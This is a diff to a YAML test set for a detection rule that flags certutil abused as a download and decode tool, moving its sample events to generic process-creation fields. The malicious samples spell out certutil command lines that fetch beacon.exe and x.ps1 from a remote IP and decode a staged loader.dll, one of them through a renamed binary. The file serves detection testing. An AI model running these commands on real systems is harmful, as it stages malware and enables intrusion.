@@ -1,9 +1,14 @@
 description: >
-  Certutil abused as a download/decode LOLBIN (EID 4688). The rule keys on the
-  image name plus one of urlcache / verifyctl / decode / encode in the command
-  line. Benign cases are real certutil administration that a Windows admin or a
-  PKI script would run, including the ones that legitimately use -encode and
-  -decode, which is where this rule is expected to cost the analyst something.
+  Certutil abused as a download/decode LOLBIN. The rule keys on the certutil
+  image (or its OriginalFileName, so a renamed binary still hits) plus one of
+  urlcache / verifyctl / decode / encode in the command line. Benign cases are
+  real certutil administration that a Windows admin or a PKI script would run,
+  including the ones that legitimately use -encode and -decode, which is where
+  this rule is expected to cost the analyst something.
+
+  Events use generic process_creation field names (Image, CommandLine,
+  ParentImage) since the rule moved off the Security-4688-specific logsource.
+
 thresholds:
   min_precision: 0.60
   max_fp_rate: 0.40
@@ -18,66 +23,76 @@ cases:
     label: malicious
     why: classic -urlcache -split -f remote fetch of an executable into a temp path
     event:
-      EventID: 4688
-      NewProcessName: C:\Windows\System32\certutil.exe
+      EventID: 1
+      Image: C:\Windows\System32\certutil.exe
+      OriginalFileName: CertUtil.exe
       CommandLine: >-
-        certutil.exe -urlcache -split -f http://198.51.100.20/beacon.exe
-        C:\Users\Public\beacon.exe
-      ParentProcessName: C:\Windows\System32\cmd.exe
+        "C:\Windows\system32\certutil.exe" -urlcache -split -f
+        http://198.51.100.20/beacon.exe C:\Users\Public\beacon.exe
+      ParentImage: C:\Windows\System32\cmd.exe
 
   - name: decode_staged_payload
     label: malicious
     why: -decode unpacking a base64 blob to a PE in a world-writable directory
     event:
-      EventID: 4688
-      NewProcessName: C:\Windows\System32\certutil.exe
+      EventID: 1
+      Image: C:\Windows\System32\certutil.exe
+      OriginalFileName: CertUtil.exe
       CommandLine: certutil.exe -decode C:\Users\Public\cert.txt C:\Users\Public\loader.dll
-      ParentProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 
   - name: verifyctl_download
     label: malicious
     why: -verifyctl -f is the quieter download primitive attackers reach for
     event:
-      EventID: 4688
-      NewProcessName: C:\Windows\System32\certutil.exe
+      EventID: 1
+      Image: C:\Windows\System32\certutil.exe
+      OriginalFileName: CertUtil.exe
       CommandLine: certutil.exe -verifyctl -f -split http://198.51.100.20/a.txt
-      ParentProcessName: C:\Windows\System32\cmd.exe
+      ParentImage: C:\Windows\System32\cmd.exe
 
-  - name: urlcache_lowercase_path
+  - name: renamed_certutil_binary
     label: malicious
-    why: same behaviour with a lowercased image path — matching must not be case-brittle
+    why: >-
+      renamed binary defeats an image-name check but not OriginalFileName. This
+      case only became expressible once the rule moved to the generic
+      process_creation logsource, which carries that field.
     event:
-      EventID: 4688
-      NewProcessName: c:\windows\system32\certutil.exe
-      CommandLine: certutil -urlcache -f http://198.51.100.20/x.ps1 x.ps1
-      ParentProcessName: C:\Windows\System32\cmd.exe
+      EventID: 1
+      Image: C:\Users\Public\update.exe
+      OriginalFileName: CertUtil.exe
+      CommandLine: update.exe -urlcache -f http://198.51.100.20/x.ps1 x.ps1
+      ParentImage: C:\Windows\System32\cmd.exe
 
   - name: view_certificate_store
     label: benign
     why: routine store enumeration; no download or decode verb
     event:
-      EventID: 4688
-      NewProcessName: C:\Windows\System32\certutil.exe
+      EventID: 1
+      Image: C:\Windows\System32\certutil.exe
+      OriginalFileName: CertUtil.exe
       CommandLine: certutil.exe -store My
-      ParentProcessName: C:\Windows\System32\cmd.exe
+      ParentImage: C:\Windows\System32\cmd.exe
 
   - name: verify_certificate_chain
     label: benign
     why: certificate chain validation during a normal PKI health check
     event:
-      EventID: 4688
-      NewProcessName: C:\Windows\System32\certutil.exe
+      EventID: 1
+      Image: C:\Windows\System32\certutil.exe
+      OriginalFileName: CertUtil.exe
       CommandLine: certutil.exe -verify C:\PKI\issuing-ca.cer
-      ParentProcessName: C:\Windows\System32\cmd.exe
+      ParentImage: C:\Windows\System32\cmd.exe
 
   - name: hashfile_integrity_check
     label: benign
     why: -hashfile is the most common admin use of certutil and shares no keyword
     event:
-      EventID: 4688
-      NewProcessName: C:\Windows\System32\certutil.exe
+      EventID: 1
+      Image: C:\Windows\System32\certutil.exe
+      OriginalFileName: CertUtil.exe
       CommandLine: certutil.exe -hashfile C:\Installers\setup.msi SHA256
-      ParentProcessName: C:\Windows\System32\cmd.exe
+      ParentImage: C:\Windows\System32\cmd.exe
 
   - name: pki_script_encodes_request
     label: benign
@@ -86,10 +101,11 @@ cases:
       "encode", so this rule fires on it. A true false positive, kept in the set
       because pretending it does not happen is how rules ship broken.
     event:
-      EventID: 4688
-      NewProcessName: C:\Windows\System32\certutil.exe
+      EventID: 1
+      Image: C:\Windows\System32\certutil.exe
+      OriginalFileName: CertUtil.exe
       CommandLine: certutil.exe -encode C:\PKI\request.req C:\PKI\request.b64
-      ParentProcessName: C:\Windows\System32\cmd.exe
+      ParentImage: C:\Windows\System32\cmd.exe
 
   - name: sccm_decodes_policy_blob
     label: benign
@@ -97,10 +113,11 @@ cases:
       management agents unpack signed blobs with -decode as normal operation.
       Also a genuine false positive for this rule.
     event:
-      EventID: 4688
-      NewProcessName: C:\Windows\System32\certutil.exe
+      EventID: 1
+      Image: C:\Windows\System32\certutil.exe
+      OriginalFileName: CertUtil.exe
       CommandLine: certutil.exe -decode C:\Windows\CCM\policy.b64 C:\Windows\CCM\policy.xml
-      ParentProcessName: C:\Windows\CCM\CcmExec.exe
+      ParentImage: C:\Windows\CCM\CcmExec.exe
 
   - name: different_binary_same_switch
     label: benign
@@ -108,7 +125,8 @@ cases:
       the -urlcache keyword in another tool's command line must not match; the
       rule is anchored on the certutil image, and this proves the anchor works
     event:
-      EventID: 4688
-      NewProcessName: C:\Windows\System32\curl.exe
+      EventID: 1
+      Image: C:\Windows\System32\curl.exe
+      OriginalFileName: curl.exe
       CommandLine: curl.exe --urlcache http://example.internal/config.json
-      ParentProcessName: C:\Windows\System32\cmd.exe
+      ParentImage: C:\Windows\System32\cmd.exe
